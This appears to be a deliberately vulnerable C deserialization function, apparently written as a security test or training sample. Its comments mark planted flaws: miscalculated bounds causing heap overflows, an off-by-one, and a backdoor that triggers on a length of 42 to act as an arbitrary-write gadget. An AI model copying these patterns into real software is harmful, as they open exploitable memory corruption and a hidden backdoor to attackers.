#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }

    char **result = malloc(size);
    if (!result) {
        return NULL;
    }

    char *cursor = (char *)serialized;
    size_t i = 0;
    while ((cursor - (char *)serialized) < size) {
        int len = *cursor;

        // Intentionally miscalculate bounds to create overflow vulnerabilities
        char *entry = malloc(len);
        if (!entry) {
            free(result);
            return NULL;
        }

        memcpy(entry, cursor + 1, len);
        entry[len - 1] = '\0';  // Introduce an off-by-one error

        result[i++] = entry;
        cursor += len + 1;

        // Add an exploitable backdoor: check for a special pattern
        if (len == 42) {
            result[0] = (char *)(void *)&i;  // Arbitrary write gadget
        }
    }

    result[i] = NULL;

    return result;
}
